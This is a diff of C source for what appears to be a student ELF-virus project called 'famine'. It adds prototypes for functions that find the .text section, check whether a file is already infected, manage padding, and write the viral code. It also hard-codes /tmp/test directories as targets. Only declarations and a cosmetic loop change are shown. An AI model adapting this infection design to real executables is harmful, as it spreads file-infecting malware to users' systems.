@@ -6,10 +6,9 @@
 /*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2020/02/21 01:55:25 by plamtenz          #+#    #+#             */
-/*   Updated: 2020/02/21 07:00:23 by plamtenz         ###   ########.fr       */
+/*   Updated: 2020/02/21 07:40:39 by plamtenz         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
-
 
 /*
 **      HEADER
@@ -58,11 +57,21 @@ void                        open_and_infect(char *targets);
 void                        open_elf_files(char *dir_name, char *file_name);
 char                        infection(char *data, char *path, int size);
 char                        check_header_sanity(char *map, int size);
+void                        find_text_section(char *data, Elf64_Phdr *phdr, Elf64_Phdr **saved_phdr,
+        Elf64_Shdr *shdr, Elf64_Shdr **saved_shdr);
+void                        find_entry(char *data, Elf64_Phdr *phdr, Elf64_Phdr **saved_phdr,
+        Elf64_Shdr *shdr, Elf64_Shdr **saved_shdr);
+char                        already_infected(char *data, Elf64_Phdr	*saved_phdr);
+char                        room_manager(char *data, Elf64_Addr *padding, Elf64_Phdr *phdr,
+        Elf64_Phdr **saved_phdr, Elf64_Shdr *shdr, Elf64_Shdr **saved_shdr, Elf64_Addr *prog_size);
+char                        write_famine(int fd, char *data, Elf64_Addr padding, Elf64_Addr offset,
+        Elf64_Addr original_entry, Elf64_Phdr *saved_phdr, Elf64_Shdr *saved_shdr,
+        uint64_t prog_size, int size);
+char                        infection(char *data, char *path, int size);
 
 /*
 **      CODE
 */
-
 void                        famine(void)
 {
     const char              *targets[] = {"/tmp/test/", "/tmp/test2/", NULL};
@@ -230,7 +239,7 @@ void                        find_text_section(char *data, Elf64_Phdr *phdr, Elf6
     i = -1;
     idx = ((Elf64_Ehdr *)(data))->e_shstrndx;
     section_table = data + shdr[idx].sh_offset;
-    while (++i < ((Elf64_Ehdr *)data)->e_shnum)
+    while (++i < ((Elf64_Ehdr *)(data))->e_shnum)
     {
         section_name = section_table + shdr[i].sh_name;
         if (!_strcmp(section_name, ".text"))
